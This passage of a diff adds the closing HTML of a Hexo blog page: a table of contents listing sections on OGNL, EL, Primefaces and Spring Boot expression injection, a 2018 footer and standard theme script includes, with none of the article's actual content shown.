href="#执行代码："><span class="nav-number">3.</span> <span class="nav-text">执行代码：</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#OGNL表达式注入："><span class="nav-number">3.1.</span> <span class="nav-text">OGNL表达式注入：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#EL表达式注入："><span class="nav-number">3.2.</span> <span class="nav-text">EL表达式注入：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Primefaces框架表达式注入"><span class="nav-number">3.3.</span> <span class="nav-text">Primefaces框架表达式注入:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Spring-Boot框架表达式注入"><span class="nav-number">3.4.</span> <span class="nav-text">Spring Boot框架表达式注入</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Misaki</span>
+
+  
+</div>
+
+
+  <!--<div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">This Me -
+  <a class="theme-link" target="_blank" href="https://misakitoto.github.io/">MISAKI
+  </a></div>-->
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=8.8.8"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=8.8.8"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=8.8.8"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=8.8.8"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=8.8.8"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+  <script type="text/javascript" color="0,0,255" opacity='0.7' zIndex="-2" count="100" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+  
+</body>
+</html>
+<script type="text/javascript" src="/js/src/love.js"></script>
+
